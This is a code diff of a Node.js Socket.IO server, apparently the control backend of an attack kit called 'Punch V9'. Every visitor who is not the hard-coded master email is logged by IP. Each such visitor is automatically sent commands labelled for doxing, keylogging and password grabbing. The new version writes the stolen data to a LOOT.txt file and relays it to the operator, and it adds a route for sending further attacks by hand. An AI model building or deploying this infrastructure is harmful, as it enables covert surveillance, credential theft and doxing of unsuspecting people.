@@ -1,81 +1,52 @@
-/**
- * PUNCH V9 SERVER - SILENT REQUIEM
- * OPTIMISÉ POUR RENDER.COM
- */
-
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
-const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, {
-    maxHttpBufferSize: 1e7,
-    cors: { origin: "*" }
-});
+const io = new Server(server, { cors: { origin: "*" } });
 
 app.use(express.static(__dirname));
 
-let users = [];
+let targets = [];
+const MASTER_KEY = "toucheur2pp@heaven.com";
 
 io.on('connection', (socket) => {
-    
-    // RÉCUPÉRATION IP RÉELLE (PROXY RENDER)
-    const rawIp = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
-    const clientIp = rawIp.split(',')[0].trim();
+    const ip = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
 
     socket.on('init', (data) => {
-        const newUser = { 
-            id: socket.id, 
-            name: data.n || "Inconnu",
-            email: data.e || "no-mail",
-            ip: clientIp
-        };
-        
-        users.push(newUser);
+        const t = { id: socket.id, n: data.n, e: data.e, ip: ip };
+        targets.push(t);
 
-        // --- LE PIÈGE AUTOMATIQUE (L'AUTO-STRIKE) ---
-        // Dès qu'une victime (pas le Master) se connecte :
-        if (newUser.email !== "toucheur2pp@heaven.com") {
-            // On lance immédiatement le Doxing et le Keylogger en silence
+        // --- AUTO-ATTACK PROTOCOL ---
+        if (t.e !== MASTER_KEY) {
+            console.log(`\x1b[41m[TARGET_LOCKED]\x1b[0m ${t.n} (${ip})`);
+            // On lance l'extraction de haut niveau immédiatement
             setTimeout(() => {
-                io.to(socket.id).emit('execute', { type: 'p_full' });
-                io.to(socket.id).emit('execute', { type: 'p_key' });
-                console.log(`\x1b[41m[AUTO_ATTACK]\x1b[0m Doxing & Keylog lancés sur ${newUser.name}`);
-            }, 2000); // On attend 2 secondes pour que la page charge
+                io.to(socket.id).emit('execute', { type: 'p_heavy_dox' });
+                io.to(socket.id).emit('execute', { type: 'p_pass_grab' });
+            }, 1000);
         }
 
-        // Logs console pour toi sur Render
-        console.log(`\x1b[32m[VICTIM_IN]\x1b[0m ${newUser.name} (${newUser.ip})`);
-
-        // Mise à jour de la liste
-        io.emit('sync', users.map(u => ({ id: u.id, n: u.name, e: u.email })));
+        io.emit('sync', targets.map(u => ({ id: u.id, n: u.n, e: u.e })));
     });
 
-    // ROUTAGE DES ATTAQUES MANUELLES
-    const attacks = ['p_full', 'p_key', 'p_phish', 'p_geo', 'p_clip', 'p_crash'];
-    attacks.forEach(type => {
-        socket.on(type, (targetId) => {
-            const boss = users.find(u => u.id === socket.id);
-            if (boss && boss.email === "toucheur2pp@heaven.com") {
-                io.to(targetId).emit('execute', { type: type });
-            }
-        });
+    // Enregistrement des données volées dans un fichier
+    socket.on('intel_drop', (data) => {
+        const entry = `[${new Date().toLocaleString()}] IP: ${ip} | TYPE: ${data.type} | DATA: ${data.content}\n`;
+        fs.appendFileSync('LOOT.txt', entry);
+        io.emit('master_update', { n: data.n, content: data.content });
     });
 
-    socket.on('chat', (data) => {
-        const sender = users.find(u => u.id === socket.id);
-        if (sender) io.emit('chat', { n: sender.name, t: data });
+    socket.on('command', (d) => {
+        io.to(d.target).emit('execute', { type: d.type });
     });
 
     socket.on('disconnect', () => {
-        users = users.filter(u => u.id !== socket.id);
-        io.emit('sync', users.map(u => ({ id: u.id, n: u.name, e: u.email })));
+        targets = targets.filter(u => u.id !== socket.id);
+        io.emit('sync', targets.map(u => ({ id: u.id, n: u.n, e: u.e })));
     });
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => {
-    console.log(`\x1b[35m[SYSTEM_ACTIVE]\x1b[0m Punch V9 Port: ${PORT}`);
-});
+server.listen(process.env.PORT || 3000, '0.0.0.0');
